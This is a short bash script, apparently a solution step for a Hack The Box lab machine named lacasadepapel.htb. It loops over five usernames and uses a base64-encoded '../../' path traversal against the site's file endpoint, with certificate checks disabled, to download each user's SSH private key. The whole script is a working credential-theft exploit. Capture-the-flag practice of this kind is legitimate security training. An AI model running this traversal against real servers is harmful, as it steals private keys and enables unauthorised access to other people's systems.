#!/bin/bash

for user in berlin dali nairobi oslo professor; do
	echo $user
	curl -k https://lacasadepapel.htb/file/$(echo -n "../../$user/.ssh/id_rsa" | base64)
done
